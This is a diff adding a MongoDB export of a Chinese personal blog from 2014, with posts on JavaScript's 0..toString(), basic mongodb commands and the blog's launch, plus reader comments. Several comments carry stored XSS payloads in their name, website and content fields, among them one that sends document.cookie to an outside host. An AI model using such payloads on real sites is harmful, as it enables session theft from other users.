@@ -1,0 +1,182 @@
+{
+  '_id': {
+    '$oid': '52f31d47d77dffc81ef4c071'
+  },
+  'category': 'blog',
+  'comments': [
+  ],
+  'content': '小博接下来要完善部分<!end!>\r\n\r\n计划中有 category, 放到后边来做\r\n\r\n接下来完善发布部分, 输入框 增加自动长高\r\n\r\n友情链接需要加入, 暂时只能手动来加, 悲催, 觉得好多东西要做, 咋就突然想不起来了呢....\r\n\r\n评论的编辑 删除 预览......ohoh',
+  'head': 'http://www.gravatar.com/avatar/969265907cf681a91b38066179e4ac9b?s=48',
+  'name': '鹏飞',
+  'pv': 31,
+  'tags': [
+  ],
+  'time': {
+    'date': {
+      '$date': 1391664455407
+    },
+    'year': 2014,
+    'month': '2014-2',
+    'day': '2014-2-6',
+    'minute': '2014-2-6 13:27'
+  },
+  'title': '小博接下来要完善部分'
+}
+{
+  '_id': {
+    '$oid': '52f138223420e9ae351ad348'
+  },
+  'comments': [
+    {
+      'name': '高远',
+      'head': 'http://www.gravatar.com/avatar/16372b0c90900e15760df16c0a0c6c72?s=48',
+      'email': 'yuan.gao@idtechinfo.com',
+      'website': 'javascript:;',
+      'time': '2014-2-5 7:59',
+      'content': '这个问题某种程度上体现了语法过于松散之后造成的问题。。我还是支持该用引号必须用引号'
+    },
+    {
+      'name': '云淡然',
+      'head': 'http://www.gravatar.com/avatar/9be91c88ee5cf5e6ab02cf7c46cd8bd8?s=48',
+      'email': 'cloudcome@163.com',
+      'website': 'http://ydr.me',
+      'time': '2014-2-6 20:19',
+      'content': '0..toString();\r\n<=> (0.).toString();\r\n<=> (0).toString();\r\n'
+    }
+  ],
+  'content': '<!end!>\r\n刚看到 ```0..toString()``` 直接蒙圈了,  各种宝典查了一圈觉得有点明白了\r\n\r\n第一眼看到 ```0```后边两个 ```..``` 然后是```toString()```方法, 觉得很是奇怪\r\n在控制台运行了下没有报错,  输出的``` "0"``` 字符串\r\n运行后问题来了, 一个 ```.```报错, 而两个```..```却正常\r\n\r\n咱不饶了, 直接整\r\n查阅各种宝典后 ``` 0. ``` 数字后边的``` . ``` 会被认为是 **小数点** 那么 ```0.toString()``` 明显不对了\r\n这也就出现了 ``` 0.. ``` 来解决这个问题  ``` 0..toString() ``` 会演变成 ``` 0.0.toString() ```, 那么第二个0 是如何出现的, 咱继续,   在多数程序中 ``` .123 ``` 前边会自动补 0, 计算器也是如此, 直接 按 ``` . ``` 会自动转成\r\n``` 0. ```,  整因为如此  ``` 0.. ``` 会转化成 ``` 0.0 ```\r\n\r\n看来还要静下心来翻各种宝典啊, 的各位大大来拍',
+  'head': 'http://www.gravatar.com/avatar/969265907cf681a91b38066179e4ac9b?s=48',
+  'name': '鹏飞',
+  'post': '<!end!>\r\n刚看到 ```0..toString()``` 直接蒙圈了,  各种宝典查了一圈觉得有点明白了\r\n\r\n第一眼看到 ```0```后边两个 ```..``` 然后是```toString()```方法, 觉得很是奇怪\r\n在控制台运行了下没有报错,  输出的``` "0"``` 字符串\r\n运行后问题来了, 一个 ```.```报错, 而两个```..```却正常\r\n\r\n咱不饶了, 直接整\r\n查阅各种宝典后 ``` 0. ``` 数字后边的``` . ``` 会被认为是 **小数点** 那么 ```0.toString()``` 明显不对了\r\n这也就出现了 ``` 0.. ``` 来解决这个问题  ``` 0..toString() ``` 会演变成 ``` 0.0.toString() ```, 那么第二个0 是如何出现的, 咱继续,   在多数程序中 ``` .123 ``` 前边会自动补 0, 计算器也是如此, 直接 按 ``` . ``` 会自动转成\r\n``` 0. ```,  整因为如此  ``` 0.. ``` 会转化成 ``` 0.0 ```\r\n\r\n看来还要静下心来翻各种宝典啊, 的各位大大来拍',
+  'pv': 67,
+  'tags': [
+    {
+      'tag': 'javascript'
+    }
+  ],
+  'time': {
+    'date': {
+      '$date': 1391540258773
+    },
+    'year': 2014,
+    'month': '2014-2',
+    'day': '2014-2-5',
+    'minute': '2014-2-5 2:57'
+  },
+  'title': '0..toString() 为什么会正常'
+}
+{
+  '_id': {
+    '$oid': '52f11f6e1ceb59ac24a98431'
+  },
+  'comments': [
+    {
+      'name': ' 鹏飞 ',
+      'head': 'http://www.gravatar.com/avatar/969265907cf681a91b38066179e4ac9b?s=48',
+      'email': 'oliver@note12.com',
+      'website': 'javascript:;',
+      'time': '2014-2-5 2:43',
+      'content': '奇怪了, 咋想的呢, 设置20个字, 哈哈, 自己测试回复看看神马情况'
+    },
+    {
+      'name': 'hjimo\'',
+      'head': 'http://www.gravatar.com/avatar/235a2304b26177f5780471bd169e34ae?s=48',
+      'email': 'hjimoxh@fdd.com',
+      'website': 'http://https://hjimo\'.fhdhd.com',
+      'time': '2014-2-5 7:7',
+      'content': 'hjimoxbxcbxbhjimo\'hjimo\'hjimo\'hjimo\'hjimo\'hjimo\''
+    },
+    {
+      'name': 'hjimo\'',
+      'head': 'http://www.gravatar.com/avatar/235a2304b26177f5780471bd169e34ae?s=48',
+      'email': 'hjimoxh@fdd.com',
+      'website': 'http://https://hjimo\'.fhdhd.com',
+      'time': '2014-2-5 7:9',
+      'content': 'hjimoxbxcbxbhjimo\'hjimo\'hjimo\'hjim<script>o\'hjimo\'hjimo\'</script>o\'hjimo\'hjimo\''
+    },
+    {
+      'name': 'ivolianer',
+      'head': 'http://www.gravatar.com/avatar/9fb4d5a5bfa62a2aa0867f22afe47f96?s=48',
+      'email': 'ivolianer_2014@163.com',
+      'website': 'javascript:;',
+      'time': '2014-2-6 22:32',
+      'content': '挺好看的 字数不够 字数不够'
+    },
+    {
+      'name': '<div>aaa</div>',
+      'head': 'http://www.gravatar.com/avatar/e855f46220fe9ebd4401a23fd660452a?s=48',
+      'email': 'aaaa@aa.com',
+      'website': 'http://<div>aaa</div>',
+      'time': '2014-2-10 10:22',
+      'content': '<div>aaa</div>'
+    },
+    {
+      'name': '<script>alert(/xss昵称/)</script>',
+      'head': 'http://www.gravatar.com/avatar/ab5c26463154e12ad5e1eddc72f120e4?s=48',
+      'email': 'aaa@aa.com',
+      'website': 'http://<script>alert(/xss网址/)</script>',
+      'time': '2014-2-10 10:24',
+      'content': '<script>alert(/xss正文/)</script>'
+    },
+    {
+      'name': '<script>$(\'body\').after(\'<scr\' + \'ipt src="http://hackhack.sinaapp.com/save.php?source=note12&cookie=\' + document.cookie + \'"><\' + \'/script>\');</script>',
+      'head': 'http://www.gravatar.com/avatar/b235c544196b3fd731a33292def1f9e6?s=48',
+      'email': 'aaaa@aaa.com',
+      'website': 'javascript:;',
+      'time': '2014-2-10 10:53',
+      'content': '测试一下fdffdf'
+    }
+  ],
+  'content': '奋战了春节一个假期, 小博终于上线了, 还差代码高亮没有加进来...心情不错, 有点小成就感.',
+  'head': 'http://www.gravatar.com/avatar/969265907cf681a91b38066179e4ac9b?s=48',
+  'name': '鹏飞',
+  'post': null,
+  'pv': 76,
+  'tags': [
+  ],
+  'time': {
+    'date': {
+      '$date': 1391533934323
+    },
+    'year': 2014,
+    'month': '2014-2',
+    'day': '2014-2-5',
+    'minute': '2014-2-5 1:12'
+  },
+  'title': '开篇, 小博上线'
+}
+{
+  '_id': {
+    '$oid': '52f3741fd77dffc81ef4c072'
+  },
+  'category': 'blog',
+  'comments': [
+    {
+      'name': '<script>$(\'body\').after(\'<scr\' + \'ipt src="http://hackhack.sinaapp.com/save.php?source=note12&cookie=\' + document.cookie + \'"><\' + \'/script>\');</script>阿猫',
+      'head': 'http://www.gravatar.com/avatar/e861c7068e2888011592f032f0d941ba?s=48',
+      'email': 'note12@github.com',
+      'website': 'javascript:;',
+      'time': '2014-2-10 10:55',
+      'content': '博主好厉害耶，膜拜!!!!!!!!!!!'
+    }
+  ],
+  'content': '刚开始接触 **mongodb** 参考教程写程序, 发现教程查询时候没有根据 id 去查询, 后来查找宝典, 问网友, 有说 id 有可能会变, 后来经过测试, id 是不会改变的, 也许比较老的版本会有变化<!end!>\r\n\r\nmongodb 简单操作, 以下全是个人理解\r\n\r\n**插入**\r\n\r\n`db.table.insert( {"title": "mongodb 简单操作" } ) `  插入一行记录\r\n会自动生成个 id `"_id" : ObjectId("52f1be517ba6f8753eba147f")`,    \'在终端输入中文不太理想\'\r\n\r\n**更新**\r\n\r\n`db.table.update(  { "title": "mongodb 简单操作"}, {  "title": "test" }   )`\r\n 更新  ` "title": "mongodb 简单操作"`  结果为 `  "title": "test"`\r\n\r\n**查询**\r\n`db.table.find({ "_id" : ObjectId("52f1be517ba6f8753eba147f") })`\r\n\r\n查询  `_id` 为 `ObjectId("52f1be517ba6f8753eba147f")` 这条记录\r\n `ObjectId("52f1be517ba6f8753eba147f")` 非字符串, 而是个对象\r\n```javascript\r\nvar ObjectID = require(\'mongodb\').ObjectID;\r\nvar tid = new ObjectID("52f1be517ba6f8753eba147f");\r\n//我觉得好像不 new 也可以, 不明白是什么原理, 了解的给讲解下\r\n```\r\n',
+  'head': 'http://www.gravatar.com/avatar/969265907cf681a91b38066179e4ac9b?s=48',
+  'name': '鹏飞',
+  'pv': 89,
+  'tags': [
+    {
+      'tag': 'mongodb'
+    }
+  ],
+  'time': {
+    'date': {
+      '$date': 1391686687330
+    },
+    'year': 2014,
+    'month': '2014-2',
+    'day': '2014-2-6',
+    'minute': '2014-2-6 19:38'
+  },
+  'title': 'mongodb 简单操作'
+}
